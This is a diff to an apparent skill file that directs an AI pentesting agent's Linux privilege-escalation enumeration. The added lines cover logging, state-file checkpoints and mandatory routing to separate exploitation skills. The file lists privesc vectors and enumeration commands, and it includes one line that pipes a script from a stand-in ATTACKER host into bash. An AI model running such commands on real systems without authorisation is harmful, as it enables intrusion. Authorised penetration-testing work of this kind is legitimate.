@@ -42,6 +42,40 @@ When an engagement directory exists, log as you work:
 - **Evidence** → save enumeration output to `engagement/evidence/` (e.g.,
   `linpeas-output.txt`, `suid-binaries.txt`).
 
+### Invocation Log
+
+Immediately on activation — before reading state.md or doing any assessment —
+log invocation to both the screen and activity.md:
+
+1. **On-screen**: Print `[linux-discovery] Activated → <target>` so the operator
+   sees which skill is running.
+2. **activity.md**: Append:
+   ```
+   ### [HH:MM] linux-discovery → <target>
+   - Invoked (assessment starting)
+   ```
+
+This entry must be written NOW, not deferred. Subsequent milestone entries
+append bullet points under this same header.
+
+## Skill Routing Is Mandatory
+
+When this skill says "→ STOP. Invoke **skill-name**" or "route to
+**skill-name**", you MUST invoke that skill using the Skill tool. Do NOT
+execute the technique inline — even if the attack is trivial or you already
+know the answer. Skills contain operator-specific methodology, client-scoped
+payloads, and edge-case handling that general knowledge does not.
+
+This applies in both guided and autonomous modes. Autonomous mode means you
+make routing decisions without asking — it does not mean you skip skills.
+
+### Scope Boundary
+
+This skill's scope is **privilege escalation enumeration and attack surface
+mapping**. You identify vectors — you do not exploit them. The moment you
+confirm a vector exists, STOP — update state.md and route to the appropriate
+technique skill. Do not execute privilege escalation commands inline.
+
 ## State Management
 
 If `engagement/state.md` exists, read it before starting. Use it to:
@@ -49,7 +83,13 @@ If `engagement/state.md` exists, read it before starting. Use it to:
 - Leverage existing credentials or access
 - Check what's been tried and failed (Blocked section)
 
-After completing enumeration, update `engagement/state.md`:
+Write `engagement/state.md` at these checkpoints (not just at completion):
+1. **After confirming a vulnerability** — add to Vulns with `[found]`
+2. **After successful exploitation** — add credentials, access, pivot paths
+3. **Before routing to another skill** — the next skill reads state.md on activation
+
+At each checkpoint and on completion, update the relevant sections of
+`engagement/state.md`:
 - **Targets**: Add system info (hostname, OS, kernel version, architecture)
 - **Access**: Update current access level (user, service account, root)
 - **Vulns**: Add confirmed privesc vectors as one-liners with `[found]` status
@@ -160,7 +200,9 @@ sudo -V 2>/dev/null | head -1  # Sudo version for CVE matching
 | Binary without full path | PATH hijack | **linux-sudo-suid-capabilities** |
 | Editor/pager/interpreter | GTFOBins escape | **linux-sudo-suid-capabilities** |
 
-If `sudo -l` returns anything usable → route to **linux-sudo-suid-capabilities**.
+If `sudo -l` returns anything usable → STOP. Invoke **linux-sudo-suid-capabilities**
+via the Skill tool. Pass: hostname, current user, sudo -l output, sudo version,
+current mode. Do not execute privilege escalation commands inline.
 
 **Doas (OpenBSD alternative):**
 
@@ -219,7 +261,10 @@ getcap -r / 2>/dev/null
 | `cap_net_raw` | Raw sockets (sniffing, spoofing) |
 | `cap_setfcap` | Set capabilities on other binaries (chain to cap_setuid) |
 
-Any SUID/capability finding → route to **linux-sudo-suid-capabilities**.
+Any SUID/capability finding → STOP. Invoke **linux-sudo-suid-capabilities** via
+the Skill tool. Pass: hostname, current user, SUID binaries or capabilities
+found, kernel version, current mode. Do not execute privilege escalation
+commands inline.
 
 ## Step 5: Scheduled Tasks and Process Monitoring
 
@@ -267,7 +312,10 @@ sort /tmp/.ps_monitor | uniq -c | sort -rn | head -30
 
 Watch for root-owned processes that execute writable scripts or use relative paths.
 
-Any finding here → route to **linux-cron-service-abuse**.
+Any finding here → STOP. Invoke **linux-cron-service-abuse** via the Skill tool.
+Pass: hostname, current user, specific findings (writable scripts, wildcard
+commands, writable unit files), kernel version, current mode. Do not execute
+exploitation commands inline.
 
 ## Step 6: File and Directory Permissions
 
@@ -331,7 +379,10 @@ echo $PATH | tr ':' '\n' | while read dir; do
 done
 ```
 
-Any finding here → route to **linux-file-path-abuse**.
+Any finding here → STOP. Invoke **linux-file-path-abuse** via the Skill tool.
+Pass: hostname, current user, specific findings (writable files, group
+memberships, library paths), kernel version, current mode. Do not execute
+exploitation commands inline.
 
 ## Step 7: Credential Hunting (Quick Scan)
 
@@ -464,7 +515,10 @@ cat /proc/version
 perl linux-exploit-suggester-2.pl -k $(uname -r)
 ```
 
-Match kernel version against known exploits → route to **linux-kernel-exploits**.
+Match kernel version against known exploits → STOP. Invoke
+**linux-kernel-exploits** via the Skill tool. Pass: hostname, kernel version,
+distribution, architecture, compiler availability, exploit-suggester output,
+current mode. Do not execute kernel exploits inline.
 
 ## Step 11: Automated Enumeration Tools
 
@@ -527,32 +581,47 @@ curl -sL https://ATTACKER/linpeas.sh | bash
 
 ## Step 12: Routing Decision Tree
 
+**Before routing**: Write `engagement/state.md` and append to
+`engagement/activity.md` with results so far. The next skill reads state.md
+on activation — stale state means duplicate work or missed context.
+
 Based on enumeration findings, route to the appropriate technique skill:
 
 ### Sudo / SUID / Capabilities Found
 
 `sudo -l` returns usable entries, SUID binaries with GTFOBins matches, sudo version
 vulnerable to CVE-2021-3156 or CVE-2019-14287, capabilities on binaries
-→ **linux-sudo-suid-capabilities**
+→ STOP. Invoke **linux-sudo-suid-capabilities** via the Skill tool. Pass:
+  hostname, current user, specific findings (sudo entries / SUID binaries /
+  capabilities), kernel version, current mode. Do not execute privilege
+  escalation commands inline.
 
 ### Scheduled Task / Service Vectors Found
 
 Writable cron scripts, wildcard injection in cron commands, writable systemd unit files,
 exploitable D-Bus services, writable Unix sockets
-→ **linux-cron-service-abuse**
+→ STOP. Invoke **linux-cron-service-abuse** via the Skill tool. Pass:
+  hostname, current user, specific findings (writable cron scripts / wildcard
+  commands / writable unit files / D-Bus services), kernel version, current
+  mode. Do not execute exploitation commands inline.
 
 ### File / Path / Group Abuse Vectors Found
 
 Writable /etc/passwd or /etc/shadow, NFS no_root_squash, writable library paths,
 docker/lxd group membership, writable PATH directories, Python path hijack, shared
 object injection, writable profile scripts
-→ **linux-file-path-abuse**
+→ STOP. Invoke **linux-file-path-abuse** via the Skill tool. Pass:
+  hostname, current user, specific findings (writable files / NFS exports /
+  library paths / group memberships), kernel version, current mode. Do not
+  execute exploitation commands inline.
 
 ### Kernel Exploit Candidates Found
 
 Kernel version matches known CVE (DirtyPipe, DirtyCow, GameOver(lay)), exploit-suggester
 returns hits, old unpatched kernel, compiler available on target
-→ **linux-kernel-exploits**
+→ STOP. Invoke **linux-kernel-exploits** via the Skill tool. Pass:
+  hostname, kernel version, distribution, architecture, compiler availability,
+  exploit-suggester output, current mode. Do not execute kernel exploits inline.
 
 ### Multiple Vectors Found
 
